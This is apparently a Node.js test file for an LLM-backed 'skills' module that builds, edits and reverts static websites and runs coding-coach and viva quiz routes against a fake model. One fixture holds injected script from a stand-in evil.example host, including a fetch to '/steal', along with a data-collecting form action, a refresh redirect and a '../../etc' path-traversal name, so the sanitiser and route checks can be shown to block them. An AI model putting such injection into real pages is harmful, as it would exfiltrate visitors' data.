// Skills (skills.js): HTML extraction/sanitising, slugs, JSON parsing, and the routes with a fake model.
// Run: node tests/skills.test.js
const fs = require('fs'), os = require('os'), path = require('path');
const S = require(path.join(__dirname, '..', 'skills.js'));
let fail = 0, total = 0;
const check = (n, ok, x) => { total++; if (!ok) { fail++; console.log('FAIL  ' + n + (x !== undefined ? ' — ' + JSON.stringify(x) : '')); } };

check('slugify', S.slugify('My College Fest 2026!') === 'my-college-fest-2026' && S.slugify('') === 'my-website' && S.slugify("Tejas's Portfolio") === 'tejass-portfolio');
check('extract from fences + chatter', S.extractHtml('Sure! Here it is:\n```html\n<!DOCTYPE html><html><body>Hi</body></html>\n```\nEnjoy!') === '<!DOCTYPE html><html><body>Hi</body></html>');
check('extract adds doctype', S.extractHtml('<html><body>x</body></html>').startsWith('<!DOCTYPE html>'));
check('extract trims text after </html>', S.extractHtml('<!DOCTYPE html><html><body>x</body></html> trailing words') .endsWith('</html>'));
check('not a page → null', S.extractHtml('I cannot do that.') === null);
const dirty = '<html><body><script src="https://evil.example/x.js"></script><form action="https://collect.example/">' +
  '<input></form><script>fetch("https://evil.example/steal")</script><meta http-equiv="refresh" content="0;url=https://x"></body></html>';
const clean = S.sanitizeHtml(dirty);
check('sanitize: remote script removed', !/evil\.example\/x\.js/.test(clean));
check('sanitize: form action removed', !/collect\.example/.test(clean));
check('sanitize: remote fetch neutralised', !/fetch\("https/.test(clean));
check('sanitize: refresh redirect removed', !/http-equiv/.test(clean));
check('parseJsonLoose: object in chatter', JSON.stringify(S.parseJsonLoose('here: {"a":1} ok')) === '{"a":1}');
check('parseJsonLoose: array', JSON.stringify(S.parseJsonLoose('```json\n["q1","q2"]\n```')) === '["q1","q2"]');
check('parseJsonLoose: junk', S.parseJsonLoose('nope') === null);
{
  const f = S.parseFix('WHAT WENT WRONG: Line 3 uses x before it is defined.\nFIX: Defined x first.\n```python\nx = 1\nprint(x)\n```');
  check('parseFix: explanation + code', /Line 3/.test(f.explanation) && /\*\*Fix:\*\* Defined x first/.test(f.explanation) && f.code === 'x = 1\nprint(x)\n', f);
  const g = S.parseFix('WHAT WENT WRONG: typo\n```\nshort\n```\nand\n```cpp\nint main(){return 0;}\n```');
  check('parseFix: the longest block is the file', /int main/.test(g.code));
  check('parseFix: no code', S.parseFix('I am not sure.').code === '');
}
check('clampScore', S.clampScore(14) === 10 && S.clampScore(-2) === 0 && S.clampScore('7.4') === 7 && S.clampScore('x') === 0);

// routes with a fake model
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sk-'));
let reply = '', lastCall = null;
const llm = { complete: async o => { lastCall = o; if (reply instanceof Error) throw reply; return typeof reply === 'function' ? reply(o) : reply; } };
const opened = [];
const routes = {}; const app = { post: (p, h) => { routes[p] = h; } };
S(app, { llm, DEFAULT_MODEL: 'm', SANDBOX: dir, openPath: p => opened.push(p), rel: p => path.relative(dir, p).split(path.sep).join('/') });
const call = async (p, body) => { let out, code = 200; await routes[p]({ body }, { json: o => { out = o; }, status: c => ({ json: o => { code = c; out = o; } }) }); return { code, ...out }; };
(async () => {
  reply = '```html\n<!DOCTYPE html><html><head><style>body{}</style></head><body><h1>Fest</h1><form action="https://x.y/"><button>Register</button></form></body></html>\n```';
  const r = await call('/api/skill/site', { what: 'college fest', sections: 'events, schedule, register', style: 'dark', name: 'Tech Fest' });
  check('site: written to Projects/<slug>/index.html', r.success && r.file === 'Projects/tech-fest/index.html' && fs.existsSync(path.join(dir, 'Projects', 'tech-fest', 'index.html')), r);
  check('site: opened in the browser', opened.length === 1 && /index\.html$/.test(opened[0]));
  check('site: saved page is sanitised', !/x\.y/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  check('site: the brief reaches the model with the rules', /college fest/.test(lastCall.messages[0].content) && /self-contained/.test(lastCall.system));
  check('site: missing brief refused', (await call('/api/skill/site', {})).code === 400);
  reply = 'Sorry, I can only chat.';
  check('site: non-page reply refused, nothing written', (await call('/api/skill/site', { what: 'blog', name: 'blog' })).code === 502 && !fs.existsSync(path.join(dir, 'Projects', 'blog')));
  reply = new Error('Local LLM unavailable');
  check('site: model errors are reported', /unavailable/.test((await call('/api/skill/site', { what: 'x' })).error));

  // edit keeps the previous version and refuses a truncated edit
  reply = '<!DOCTYPE html><html><head><style>body{}</style></head><body><h1 style="color:red">Fest</h1><form><button>Register</button></form></body></html>';
  const e = await call('/api/skill/siteEdit', { name: 'Tech Fest', change: 'make the heading red' });
  check('edit: applied, previous kept', e.success && fs.existsSync(path.join(dir, 'Projects', 'tech-fest', 'index.previous.html')) && /color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  reply = '<html><body>x</body></html>';
  check('edit: suspiciously short result refused', (await call('/api/skill/siteEdit', { name: 'Tech Fest', change: 'tiny' })).code === 502 && /color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  const rv = await call('/api/skill/siteRevert', { name: 'Tech Fest' });
  check('revert: back to the version before the edit', rv.success && !/color:red/.test(fs.readFileSync(path.join(dir, 'Projects', 'tech-fest', 'index.html'), 'utf8')));
  check('edit: unknown site', (await call('/api/skill/siteEdit', { name: 'nope', change: 'x' })).code === 404);
  check('slug keeps edits inside Projects (no path tricks)', (await call('/api/skill/siteEdit', { name: '../../etc', change: 'x' })).code === 404);

  // coach
  reply = 'Think about a hash map.';
  const h = await call('/api/skill/coach', { problem: 'Two Sum', mode: 'hint', level: 1 });
  check('coach: hint 1 with the no-code rule', h.success && h.text === 'Think about a hash map.' && /hint number 1/.test(lastCall.system) && /Never give the full solution/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'hint', level: 9 });
  check('coach: hint level capped at 3', /hint number 3/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'solution', lang: 'c++' });
  check('coach: solution in the asked language', /in C\+\+/.test(lastCall.system));
  await call('/api/skill/coach', { problem: 'Two Sum', mode: 'check', approach: 'nested loops' });
  check('coach: check sends the approach', /nested loops/.test(lastCall.messages[0].content));
  check('coach: no problem → 400', (await call('/api/skill/coach', {})).code === 400);

  // viva
  reply = '{"questions":["What is a primary key?","Explain normalization.","What is 3NF?","What is a deadlock?","Define ACID."]}';
  const vq = await call('/api/skill/viva/questions', { topic: 'DBMS' });
  check('viva: 5 questions', vq.success && vq.questions.length === 5 && vq.level === 'college (B.Tech)');
  await call('/api/skill/viva/questions', { topic: 'SDE placement interview on Java' });
  check('viva: interview level detected', /placement interview/.test(lastCall.system));
  reply = 'not json';
  check('viva: bad questions → error', (await call('/api/skill/viva/questions', { topic: 'DBMS' })).code === 502);
  reply = '{"score": 12, "feedback": "Good.", "missed": ["uniqueness","not null"], "model_answer": "A primary key uniquely identifies a row."}';
  const g = await call('/api/skill/viva/grade', { topic: 'DBMS', question: 'What is a primary key?', answer: 'it identifies rows' });
  check('viva: grade parsed and clamped', g.success && g.score === 10 && g.missed.length === 2 && /uniquely/.test(g.model));
  reply = 'garbage';
  check('viva: unparseable grade → score 0, no crash', (await call('/api/skill/viva/grade', { question: 'q', answer: 'a' })).score === 0);

  fs.rmSync(dir, { recursive: true, force: true });
  console.log(`skills: ${total - fail}/${total}`);
  process.exitCode = fail ? 1 : 0;
})();
